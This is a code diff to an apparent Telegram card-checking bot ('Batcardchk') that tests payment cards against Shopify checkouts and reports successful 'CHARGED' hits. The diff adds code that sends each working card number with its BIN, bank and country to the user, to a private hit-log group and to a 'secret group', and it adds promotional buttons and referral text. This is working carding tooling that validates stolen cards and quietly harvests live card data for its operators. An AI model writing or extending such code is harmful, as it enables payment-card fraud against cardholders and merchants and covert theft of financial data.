@@ -21,12 +21,24 @@ from telegram.request import HTTPXRequest
 
 import aiohttp as _aiohttp
 
-# ─── Hit / Share group IDs ────────────────────────────────────────────────────
-# Set CHARGED_SHARE_GROUP_ID to the numeric chat ID of the public share group.
-# Add the bot to that group as an admin (post messages) first, then paste the ID.
-HIT_LOG_GROUP_ID       = -1003999441241   # private hit-log group
-CHARGED_SHARE_GROUP_ID = 0                # https://t.me/+EVdIWIdLZqs1MTI0  ← paste real ID
-BOT_DEEP_BUY           = "https://t.me/batcardchk29_bot?start=buy"
+# ─── Charged-card notification destinations ───────────────────────────────────
+#
+#  CHANNEL_LOG_ID   →  t.me/Batcardchk  (public channel)
+#                      Clean UI posted on every charged hit — no card, no bank.
+#                      Add bot as admin ("Post messages"), then paste numeric ID.
+#
+#  HIT_LOG_GROUP_ID →  https://t.me/+BXmeotREVhllODFk  (hit log group)
+#                      Full card + BIN details posted instantly on every hit.
+#                      ✅ ID already configured: -1004361062205
+#
+#  SECRET_GROUP_ID  →  https://t.me/+OidZtuwdxhIyYjZk  (secret group)
+#                      Full card + BIN details posted instantly on every hit.
+#                      Add bot as admin → forward a msg to @userinfobot → paste ID below.
+#
+CHANNEL_LOG_ID   = 0               # t.me/Batcardchk              ← paste channel ID
+HIT_LOG_GROUP_ID = -1004361062205  # t.me/+BXmeotREVhllODFk       ✅ already set
+SECRET_GROUP_ID  = -1004499920555  # secret channel (private, full card+BIN) ✅
+BOT_DEEP_BUY     = "https://t.me/batcardchk29_bot?start=buy"
 # ─────────────────────────────────────────────────────────────────────────────
 
 # /bin handler — defined inline so mst.py (aiogram) is never imported at PTB startup
@@ -724,6 +736,8 @@ def kb_main(user_id: int) -> RawMarkup:
          _btn(B("Referral"), cb="mreferral", style="primary")],
         [_btn(B("Profile"),  cb="mprofile",  style="primary"),
          _btn(B("Support"),  url=SUPPORT_LINK, style="primary")],
+        [_btn(B("💬 Group"), url="https://t.me/+Gjwke5Yc1ddhYmZk", style="primary"),
+         _btn(B("📋 Logs"),  url="https://t.me/+BXmeotREVhllODFk", style="primary")],
     ])
 
 def kb_back(cb: str) -> RawMarkup:
@@ -2487,42 +2501,97 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     ud["credits"] = max(0, ud.get("credits", 0) - 1)
                     credits_used += 1
 
-            # ── DM user on CHARGED ─────────────────────────────────
+            # ── All CHARGED notifications (DM + channel + secret group) ─────
             if verdict == "CHARGED":
+                # BIN lookup for this card
+                try:
+                    _bin_data = await asyncio.wait_for(get_bin_info(card[:6]), timeout=8)
+                except Exception:
+                    _bin_data = {}
+                _bin_scheme  = str(_bin_data.get("scheme",  "N/A")).upper()
+                _bin_bank    = str(_bin_data.get("bank",    "N/A"))
+                _bin_cname   = str(_bin_data.get("country", "N/A"))
+                _bin_flag    = str(_bin_data.get("country_emoji", ""))
+                _bin_str     = escape(f"{_bin_scheme} - {_bin_bank} - {_bin_flag} {_bin_cname}".strip(" -"))
+
+                _elapsed_s   = time.time() - start_time
+                _time_str    = (
+                    f"{int(_elapsed_s // 60)}m {int(_elapsed_s % 60)}s"
+                    if _elapsed_s >= 60 else f"{int(_elapsed_s)}s"
+                )
+                _fname       = escape(user.first_name or "User")
+                _plan_raw    = ud.get("plan", "")
+                _plan_eid    = get_plan_emoji_id(_plan_raw)
+                _live_eid    = get_random_live_emoji()
+
+                # ── Beautiful DM to the card checker ──────────────────────
+                _hit_text = (
+                    f'<b><a href="{CHANNEL_LINK}">[❆]</a> Charged '
+                    f'{tg_emoji(PROG_CHARGED_EMOJI_ID, "💎")}</b>\n'
+                    f'\n'
+                    f'<b>{tg_emoji(CARD_EMOJI_ID, "💳")}</b>\n'
+                    f'<b>   ⤷ <code>{escape(card)}</code></b>\n'
+                    f'<b>Gate ➳ Shopify | {escape(price)} {escape(currency)}</b>\n'
+                    f'<b>──────────</b>\n'
+                    f'<b>Resp ➳ {escape(resp_text[:120])}</b>\n'
+                    f'<b>Bin  ➳ <code>{_bin_str}</code></b>\n'
+                    f'<b>──────────</b>\n'
+                    f'<b>{tg_emoji(TIME_EMOJI_ID, "⏱")} ➳ {_time_str}</b>\n'
+                    f'<b>{tg_emoji(USER_EMOJI_ID, "👤")} ➳ {_fname} '
+                    f'{tg_emoji(_plan_eid, "⭐")}</b>\n'
+                    f'<b>{tg_emoji(DEV_EMOJI_ID, "⚡")} ➳ '
+                    f'<a href="{DEV_LINK}">{BOT_NAME}</a> '
+                    f'{tg_emoji(PRO_EMOJI_ID, "⭐")}</b>'
+                )
                 try:
                     await context.bot.send_message(
                         chat_id=user.id,
-                        text=(
-                            f"{E_CHARGED} <b>CHARGED #{charged_count}</b>\n"
-                            f"──────────\n"
-                            f"{E_CARD} <b>⤷ <code>{escape(card)}</code></b>\n"
-                            f"<b>Gate ➳ Shopify | {escape(price)} {escape(currency)}</b>\n"
-                            f"──────────\n"
-                            f"<b>Resp ➳ {escape(resp_text[:120])}</b>\n"
-                            f"──────────\n"
-                            f"{E_DEV} ➳ {BOT_NAME} {E_PRO}"
-                        ),
+                        text=_hit_text,
                         parse_mode="HTML",
+                        disable_web_page_preview=True,
                     )
                 except Exception:
                     pass
 
-                # ── Auto-forward to public share group (clean UI, no card/bank) ──
-                if CHARGED_SHARE_GROUP_ID:
-                    fname = escape(user.first_name or "User")
+                # ── Public channel: clean UI, no card, no bank ─────────────
+                if CHANNEL_LOG_ID:
                     try:
                         await context.bot.send_message(
-                            chat_id=CHARGED_SHARE_GROUP_ID,
+                            chat_id=CHANNEL_LOG_ID,
                             text=(
                                 f"<b>HIT ➛ CHARGED 💎</b>\n"
                                 f"<b>Gate ➛ Shopify Payments</b>\n"
                                 f"<b>✅ ORDER_PAID</b>\n"
-                                f"<b>User ➛ {fname} ⭐</b>"
+                                f"<b>User ➛ {_fname} ⭐</b>"
                             ),
                             parse_mode="HTML",
                             reply_markup=InlineKeyboardMarkup([[
                                 InlineKeyboardButton("🤖 Batmancardchk", url=BOT_DEEP_BUY)
                             ]])
+                        )
+                    except Exception:
+                        pass
+
+                # ── Hit log group: full card + BIN details (instant) ──────────
+                if HIT_LOG_GROUP_ID:
+                    try:
+                        await context.bot.send_message(
+                            chat_id=HIT_LOG_GROUP_ID,
+                            text=_hit_text,
+                            parse_mode="HTML",
+                            disable_web_page_preview=True,
+                        )
+                    except Exception:
+                        pass
+
+                # ── Secret group: full card + BIN details ──────────────────
+                if SECRET_GROUP_ID:
+                    try:
+                        await context.bot.send_message(
+                            chat_id=SECRET_GROUP_ID,
+                            text=_hit_text,
+                            parse_mode="HTML",
+                            disable_web_page_preview=True,
                         )
                     except Exception:
                         pass
@@ -2972,11 +3041,13 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         total_refs = ud_r.get("total_refs", 0)
         await query.message.edit_text(
             f"<b>{E_USER} {B('Referral Program')}</b>\n──────────\n"
-            f"<b>Link</b>      ➳ <code>{link}</code>\n──────────\n"
-            f"<b>Referrals</b> ➳ {total_refs}\n"
-            f"<b>Earned</b>    ➳ {total_refs * REFERRAL_CREDITS} credits\n"
-            f"<b>Per Ref</b>   ➳ +{REFERRAL_CREDITS} credits\n──────────\n"
-            "Share your link to earn free credits!",
+            f"<b>Your Link</b>  ➳ <code>{link}</code>\n──────────\n"
+            f"<b>Channel</b>    ➳ <a href='{CHANNEL_LINK}'>t.me/Batcardchk</a>\n"
+            f"<b>Referrals</b>  ➳ {total_refs}\n"
+            f"<b>Earned</b>     ➳ {total_refs * REFERRAL_CREDITS} credits\n"
+            f"<b>Per Ref</b>    ➳ +{REFERRAL_CREDITS} credits\n──────────\n"
+            f"Share your link — earn credits for every new user!\n"
+            f"📢 Also share: <a href='{CHANNEL_LINK}'>t.me/Batcardchk</a>",
             parse_mode="HTML",
             reply_markup=kb_back("bmain"),
             disable_web_page_preview=True,
